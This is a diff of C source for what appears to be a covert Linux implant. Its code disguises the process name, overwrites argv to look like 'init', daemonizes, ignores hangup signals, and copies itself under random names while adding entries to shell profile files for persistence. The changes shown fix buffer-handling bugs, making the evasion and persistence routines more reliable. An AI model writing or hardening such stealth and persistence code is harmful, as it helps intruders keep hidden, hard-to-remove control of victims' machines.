@@ -37,25 +37,23 @@ static const char* get_random_name(void) {
 static int safe_strncpy(char *dest, const char *src, size_t size) {
     if (!dest || !src || size == 0) return -1;
     size_t len = strlen(src);
-    if (len >= size - 1) return -1;
-    memmove(dest, src, len);
+
+    if (len >= size) {
+        return -1;
+    }
+    memcpy(dest, src, len);
     dest[len] = '\0';
     return 0;
 }
 
 static int join_path(char *dest, size_t dest_size, const char *dir, const char *file) {
     if (!dest || !dir || !file || dest_size == 0) return -1;
-    size_t dir_len = strlen(dir);
-    size_t file_len = strlen(file);
-    size_t req_len = dir_len + file_len + 2; // +1 for '/' and +1 for '\0'
-    if (req_len > dest_size) return -1;
-    //fix buffer overflow 1
-    memcpy(dest, dir, dir_len);
-    dest[dir_len] = '/';
-    //overflow 2
-    //snprintf->memcpy
-    memcpy(dest + dir_len + 1, file, file_len);
-    dest[req_len - 1] = '\0';
+
+    int written = snprintf(dest, dest_size, "%s/%s", dir, file);
+    if (written < 0 || (size_t)written >= dest_size) {
+        if (dest_size > 0) dest[0] = '\0';
+        return -1;
+    }
     return 0;
 }
 
@@ -104,8 +102,8 @@ void* rename_process(void* arg) {
         const char* new_name = process_names[name_index];
         char* env_ptr = (char*)getenv("_");
         if (env_ptr) {
-            size_t env_size = strlen(env_ptr);
-            safe_strncpy(env_ptr, new_name, env_size + 1);
+            size_t env_val_len = strlen(env_ptr);
+            safe_strncpy(env_ptr, new_name, env_val_len + 1);
             prctl(PR_SET_NAME, new_name);
         }
         last_name_index = name_index;
@@ -170,7 +168,12 @@ void* watchdog(void* arg) {
     time_t last = time(NULL);
     char path[PATH_MAX], exe[PATH_MAX];
     pid_t pid = getpid();
-    if (readlink("/proc/self/exe", exe, sizeof(exe)-1) < 0) return NULL;
+
+    ssize_t rlen = readlink("/proc/self/exe", exe, sizeof(exe) - 1);
+    if (rlen < 0) {
+        return NULL;
+    }
+    exe[rlen] = '\0';
     
     while (1) {
         FILE* f = fopen("/proc/self/status", "r");
@@ -243,9 +246,10 @@ int startup_persist(const char *source_path) { //2
                 
                 char dest_path[PATH_MAX] = {0};
                 const char* name = get_random_name();
-                size_t remaining = sizeof(dest_path);
-                size_t written = snprintf(dest_path, remaining, "%s/%s_%x", dest_dir, name, rand_val);
-                if (written >= remaining) continue;
+                // snprintf used here is already safe.
+                size_t remaining_dest_path = sizeof(dest_path);
+                int written_dest_path = snprintf(dest_path, remaining_dest_path, "%s/%s_%x", dest_dir, name, rand_val);
+                if (written_dest_path < 0 || (size_t)written_dest_path >= remaining_dest_path) continue;
                 
                 if (access(dest_path, F_OK) == 0) continue;
                 
@@ -272,8 +276,9 @@ int startup_persist(const char *source_path) { //2
                         int entry_exists = 0;
                         FILE *check = fopen(profile_path, "r");
                         if (check) {
-                            char line[PATH_MAX];
+                            char line[PATH_MAX]; 
                             while (fgets(line, sizeof(line), check)) {
+                                line[strcspn(line, "\n")] = 0;
                                 if (strcmp(line, dest_path) == 0) {
                                     entry_exists = 1;
                                     break;
@@ -310,12 +315,11 @@ void setup_signal_handlers() {
     memset(&sa, 0, sizeof(sa));
     sa.sa_handler = SIG_IGN;
     sigemptyset(&sa.sa_mask);
-    sa.sa_flags = 0;
-    
+
     if (sigaction(SIGPIPE, &sa, NULL) != 0) return;
     if (sigaction(SIGHUP, &sa, NULL) != 0) return;
     
-    sa.sa_handler = signal_handler;
+    sa.sa_handler = signal_handler; 
     if (sigaction(SIGTERM, &sa, NULL) != 0) return;
     if (sigaction(SIGINT, &sa, NULL) != 0) return;
     
@@ -328,23 +332,40 @@ void setup_signal_handlers() {
 void daemonize(int argc, char** argv) {
     pid_t pid = fork();
     if (pid > 0) _exit(0);
+    if (pid < 0) _exit(1);
 
-    setsid();
+    if(setsid() < 0) _exit(1);
 
     pid = fork();
     if (pid > 0) _exit(0);
+    if (pid < 0) _exit(1);
 
     int _chdir_ret = chdir("/");
     (void)_chdir_ret;
     umask(0);
+
+    // Close all open file descriptors
     struct rlimit rlim;
-    if (!getrlimit(RLIMIT_NOFILE, &rlim)) {
-        for (int i = 0; i < (int)rlim.rlim_max; i++) close(i);
+    if (getrlimit(RLIMIT_NOFILE, &rlim) == 0) {
+        for (int i = 0; i < (int)rlim.rlim_cur; i++) {
+             if (i != STDIN_FILENO && i != STDOUT_FILENO && i != STDERR_FILENO) {
+                // Though these will be duped over anyway. Standard practice is close all.
+             }
+             close(i);
+        }
+    } else { 
+        for (int i = 0; i < 1024; i++) close(i);
     }
+
+
     int fd = open("/dev/null", O_RDWR);
     if (fd >= 0) {
-        dup2(fd, 0); dup2(fd, 1); dup2(fd, 2);
-        if (fd > 2) close(fd);
+        dup2(fd, STDIN_FILENO);
+        dup2(fd, STDOUT_FILENO);
+        dup2(fd, STDERR_FILENO);
+        if (fd > STDERR_FILENO) {
+            close(fd);
+        }
     }
     protect_process();
     pthread_attr_t attr;
@@ -357,10 +378,21 @@ void daemonize(int argc, char** argv) {
 }
 
 void overwrite_argv(int argc, char** argv) {
-    if (!argv || argc <= 0) return;
-    for (int i = 0; i < argc && argv[i]; i++) {
-        size_t len = strlen(argv[i]);
-        if (len > 0) explicit_bzero(argv[i], len);
+    if (!argv || argc <= 0 || !argv[0]) {
+        return;
     }
-    if (argv[0] && strlen(argv[0]) >= 4) memcpy(argv[0], "init", 4);
+
+    char* argv0_ptr = argv[0];
+    size_t argv0_len = strlen(argv[0]);
+
+    for (int i = 0; i < argc && argv[i] != NULL; i++) {
+        size_t current_arg_len = (argv[i] == argv0_ptr) ? argv0_len : strlen(argv[i]);
+        if (current_arg_len > 0) {
+            explicit_bzero(argv[i], current_arg_len);
+        }
+    }
+
+    if (argv0_len > 0) { 
+        snprintf(argv0_ptr, argv0_len, "init");
+    }
 }
